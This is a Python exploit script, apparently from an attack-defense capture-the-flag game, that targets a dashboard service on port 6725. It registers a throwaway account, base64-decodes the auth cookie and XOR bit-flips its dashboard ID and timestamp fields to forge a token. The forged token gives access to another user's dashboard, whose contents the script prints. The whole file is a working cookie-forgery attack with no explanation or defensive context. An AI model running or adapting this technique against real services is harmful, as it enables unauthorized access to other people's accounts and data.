#!/usr/bin/python3

import sys
import requests
import base64
import random
import string
import re
import urllib
import struct
import math
import time
import datetime

def get_rand_string(l):
	return ''.join(random.choice(string.ascii_lowercase) for _ in range(l))

hostname, dashboard = sys.argv[1:]

host = 'http://{}:{}/'.format(hostname, 6725)

session = requests.Session()

user, password = get_rand_string(8), get_rand_string(16)
session.post(host + 'user/register', data={'username': user, 'password': password})

name, desc = get_rand_string(8), get_rand_string(16)
response = session.post(host + 'dashboard/create', data={'name': name, 'description': desc})

getDashboardId = re.compile('dashboardId=(\d+)', re.IGNORECASE)
m = getDashboardId.search(response.url)

actual = int(m.group(1))
expected = int(dashboard)

diff = actual ^ expected

cookie = urllib.parse.unquote(session.cookies['auth'])
token = base64.b64decode(cookie) 

data = list(struct.unpack('<QQQQ', token))
data[2] ^= diff

token = struct.pack('<QQQQ', data[0], data[1], data[2], data[3])
session.cookies.clear()
session.cookies['auth'] = urllib.parse.quote(base64.b64encode(token).decode())

url = host + 'dashboard/view?dashboardId=' + dashboard
response = session.get(url)

#print(response.text)

getTime = re.compile(r'set at (\d+)', re.IGNORECASE)
m = getTime.search(response.text)

adate = int(m.group(1))
ndate = int(time.time() + 5 * 60 * 60);

diff = adate ^ ndate
data[1] ^= diff

token = struct.pack('<QQQQ', data[0], data[1], data[2], data[3])
session.cookies.clear()
session.cookies['auth'] = urllib.parse.quote(base64.b64encode(token).decode())

url = host + 'dashboard/view?dashboardId=' + dashboard
response = session.get(url)

print(response.text)
